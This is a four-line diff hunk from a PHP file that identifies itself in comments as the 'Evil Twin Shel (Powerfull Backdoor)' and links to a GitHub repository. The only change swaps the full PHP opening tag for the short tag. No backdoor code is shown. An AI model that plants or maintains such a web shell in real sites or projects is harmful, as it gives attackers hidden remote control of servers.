@@ -1,4 +1,4 @@
-<?php
+<?
 // Evil Twin Shel (Powerfull Backdoor)
 // https://github.com/eviltwin-dev/eviltwin-shell
 ##################################################################################################
